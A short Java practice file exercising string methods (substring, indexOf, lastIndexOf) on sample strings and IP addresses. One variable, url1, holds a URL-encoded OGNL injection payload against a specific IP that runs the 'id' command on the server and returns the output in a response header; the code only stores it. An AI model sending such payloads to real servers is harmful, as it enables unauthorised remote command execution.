package com.base.string;

import javax.accessibility.AccessibleKeyBinding;
import java.util.Arrays;

public class main {
    public static void main(String[] args) {
        String s="123456789";
        System.out.println(s.substring(0, 5));

        String s1="abc",s2="weraabafsdfabcwer";
        System.out.println(">"+s2.indexOf(s1));

        String ip1 = "2408:824e:d12:e350:8957:6631:763f:f5be";
        String ip2 = "114.88.72.206";
        System.out.println("ip1:"+ip1.lastIndexOf(":"));
        System.out.println("ip2:"+ip2.lastIndexOf("."));
        System.out.println("ip2:"+ip2.lastIndexOf(":"));
        System.out.println("ip2:"+ip2.substring(0,ip2.lastIndexOf(".")));

        String url1 = "http://121.36.141.65:8090/%24%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22%2Cnull%29.invoke%28null%2Cnull%29.setHeader%28%22X-Cmd-Response%22%2CClass.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22var%20d%3D%27%27%3Bvar%20i%20%3D%20java.lang.Runtime.getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%3B%20while%28i.available%28%29%29d%2B%3DString.fromCharCode%28i.read%28%29%29%3Bd%22%29%29%7D/";
        boolean check = "121.36.141.65".contains("121.36.141.65");
        System.out.println("url1:"+ check);
    }
}
